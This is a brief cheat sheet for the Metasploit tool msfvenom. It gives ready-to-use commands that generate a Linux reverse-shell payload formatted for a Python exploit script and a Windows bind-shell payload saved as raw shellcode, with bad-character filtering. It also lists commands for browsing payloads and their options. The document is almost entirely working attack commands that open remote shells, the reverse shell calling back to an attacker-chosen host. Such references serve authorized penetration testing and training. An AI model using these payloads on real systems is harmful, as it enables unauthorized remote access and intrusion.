# msfvenom

payload generator and encoder

## Linux reverse shell (to be included in a Python script)

* specify the format (`f`)
* specify the variable name (`v`)

```
msfvenom -p linux/x86/shell_reverse_tcp -f python -b '\x00\r\n' -v payload LHOST=<host> LPORT=<port> EXITFUNC=thread
```

## Windows bind shell (save the raw bytes to a file)

* save the result to a file (`o`)

```
msfvenom -p windows/shell_bind_tcp -f raw -b '\x00\r\n' -o shellcode.bin LPORT=<port> EXITFUNC=thread
```

## list Linux-specific payloads

```
msfvenom -l payloads | grep "linux/*"
```

## list the payload's options

```
msfvenom -p <payload> --list-options
```
